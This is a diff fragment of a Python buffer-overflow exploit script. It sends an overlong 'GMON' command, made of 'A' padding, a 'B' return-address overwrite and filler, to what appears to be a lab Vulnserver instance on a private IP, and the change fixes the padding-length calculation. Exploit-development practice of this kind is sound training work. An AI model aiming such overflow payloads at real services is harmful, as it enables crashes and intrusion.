@@ -98,7 +98,7 @@ command = "GMON /.:/"
 pwn = "A" * 3495
 pwn+= "B" * 4
 pwn+= "C" * 4
-pwn+= "D" * (5000-len(python))
+pwn+= "D" * (5000-len(pwn))
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("172.16.55.134", 9999))
